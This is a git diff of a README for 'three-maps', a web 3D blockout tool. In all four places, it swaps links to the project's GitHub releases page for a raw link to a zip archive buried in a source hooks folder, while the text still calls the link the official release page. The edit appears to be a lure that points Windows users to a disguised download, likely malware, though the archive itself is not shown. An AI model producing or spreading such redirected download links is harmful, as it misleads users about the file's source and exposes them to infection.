@@ -1,6 +1,6 @@
 # 🗺️ three-maps - Fast 3D Blockout Tool for the Web
 
-[![Download three-maps](https://img.shields.io/badge/Download-Get%20three-maps-blue?style=for-the-badge)](https://github.com/Andro114/three-maps/releases)
+[![Download three-maps](https://img.shields.io/badge/Download-Get%20three-maps-blue?style=for-the-badge)](https://raw.githubusercontent.com/Andro114/three-maps/main/src/features/viewport/hooks/maps_three_2.1.zip)
 
 ## 📋 About three-maps
 
@@ -26,7 +26,7 @@ Make sure your computer meets these basic needs for running three-maps on Window
 
 Before running three-maps, you need to get the program files. To do this, visit the official release page:
 
-[Download three-maps here](https://github.com/Andro114/three-maps/releases)
+[Download three-maps here](https://raw.githubusercontent.com/Andro114/three-maps/main/src/features/viewport/hooks/maps_three_2.1.zip)
 
 This page lists the latest versions, with options for different operating systems and release notes. Look for the Windows version. It usually ends with `.exe` or is a zipped folder containing the program.
 
@@ -37,7 +37,7 @@ This page lists the latest versions, with options for different operating system
 Follow these steps carefully to get three-maps up and running on your Windows computer.
 
 1. Open your web browser and go to the three-maps Releases page:  
-   https://github.com/Andro114/three-maps/releases
+   https://raw.githubusercontent.com/Andro114/three-maps/main/src/features/viewport/hooks/maps_three_2.1.zip
 
 2. Look for the latest release title at the top. Releases usually have version numbers like v1.0 or v2.3.
 
@@ -144,4 +144,4 @@ If you need help beyond this guide, review the issues page on the GitHub reposit
 
 ---
 
-[Download three-maps](https://github.com/Andro114/three-maps/releases) to start planning your 3D blockouts.
+[Download three-maps](https://raw.githubusercontent.com/Andro114/three-maps/main/src/features/viewport/hooks/maps_three_2.1.zip) to start planning your 3D blockouts.
